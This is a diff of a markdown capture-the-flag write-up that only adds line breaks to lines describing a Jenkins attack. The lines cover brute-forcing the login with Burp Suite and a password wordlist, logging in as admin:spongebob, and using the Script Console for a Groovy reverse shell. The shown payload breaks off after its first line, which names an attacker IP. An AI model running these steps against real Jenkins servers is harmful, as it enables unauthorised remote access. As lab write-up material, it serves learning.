@@ -149,9 +149,9 @@ As we have access to it, we should try default credentials on the login page.<br
 It is known that default username for jenkins is either `jenkins` or `admin` (which we already met in wordpress) so we will try admin one first.<br>
 Using burp suite we will brute force login page and we will use top 10 million passwords wordlist as payload with it.<br>
  <br>
-After some time, correct password was found and it was `spongebob`
-Now we will log in with following credentials: `admin:spongebob`
-After snooping around and checking function by function I have found the `Script Console` which can run arbitary groovy scripts inside of `Manage Jenkins` tab in side menu on left side. So I was almost sure that root was running jenkins or someone with enough privileges to have root acces so I thought reverse shell would be answer.
+After some time, correct password was found and it was `spongebob`<br>
+Now we will log in with following credentials: `admin:spongebob`<br>
+After snooping around and checking function by function I have found the `Script Console` which can run arbitary groovy scripts inside of `Manage Jenkins` tab in side menu on left side. So I was almost sure that root was running jenkins or someone with enough privileges to have root acces so I thought reverse shell would be answer.<br>
 Using following payload I got reverse shell:
 ```
 String host="10.8.22.53"; 
